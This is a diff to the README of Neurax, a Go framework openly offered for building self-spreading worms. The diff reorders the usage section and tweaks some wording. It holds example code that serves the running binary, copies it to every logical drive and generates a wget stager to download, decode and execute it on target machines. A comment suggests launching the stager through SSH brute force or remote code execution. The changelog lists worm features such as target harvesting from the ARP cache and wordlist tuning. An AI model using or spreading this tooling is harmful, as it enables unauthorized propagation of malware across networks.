@@ -8,7 +8,42 @@
 <p align="center"> A framework that aids in creation of self-spreading software</p>
 
 <br></br>
-## New in v. 2.X
+
+## Usage
+With help of Neurax, Golang binaries can spread on LAN/WAN without using any external servers.
+
+Diverse config options and command stagers allow rapid propagation across various wireless environments.
+
+
+### Example code
+
+```go
+package main
+import . "github.com/redcode-labs/Neurax"
+
+func main(){
+
+  //Specify serving port and stager to use
+  Nrx.Config.Port = 5555
+  Nrx.Config.Stager = "wget"
+
+  //Start a server that exposes the current binary in the background
+  go NeuraxServer()
+ 
+  //Copy current binary to all logical drives
+  NeuraxDisks()
+
+  //Create a command stager that should be launched on target machine
+  //It will download, decode and execute the binary
+  cmd_stager := NeuraxStager()
+
+  /* Now you have to somehow execute the command generated above.
+     You can use SSH bruteforce, some RCE or whatever else you want ;> */
+
+}
+```
+<br></br>
+## New in v. 2.X (separate sub-project)
 - Refactor: abandoned framework-like approach in favour of a ready-to-use binary
 - Generic wget stager for all UNIX targets
 - Single config file to tweak worm's behaviour on the fly
@@ -41,7 +76,7 @@ I will come up with a decent alternative prior to next release.
 - Extraction of target candidates from ARP cache
 - Possibility to scan only a selected list of targets + prioritizing specific targets (such as default gateways)
 - Possibility to specify interface and timeout when using passive network scan.
-- Improved command stager (can be optionally executed with elevated privilleges / multiple times)
+- Improved command stager (can be optionally executed with elevated privileges / multiple times)
 - Few changes of options' names
 - `NeuraxConfig.` became `N.` (cause it's shorter to type)
 - Functions for random memory allocation + binary migration
@@ -49,40 +84,6 @@ I will come up with a decent alternative prior to next release.
 - Volume and complexity of created wordlist can be easily tuned (with options such as `.WordlistExpand`)
 - Possibility to set time-to-live of created binary
 
-## Usage
-With help of Neurax, Golang binaries can spread on local network without using any external servers.
-
-Diverse config options and command stagers allow rapid propagation across various wireless environments.
-
-
-
-### Example code
-
-```go
-package main
-import . "github.com/redcode-labs/Neurax"
-
-func main(){
-
-  //Specify serving port and stager to use
-  N.Port = 5555
-  N.Stager = "wget"
-
-  //Start a server that exposes the current binary in the background
-  go NeuraxServer()
- 
-  //Copy current binary to all logical drives
-  NeuraxDisks()
-
-  //Create a command stager that should be launched on target machine
-  //It will download, decode and execute the binary
-  cmd_stager := NeuraxStager()
-
-  /* Now you have to somehow execute the command generated above.
-     You can use SSH bruteforce, some RCE or whatever else you want ;> */
-
-}
-```
 
 ### List of config entries
 
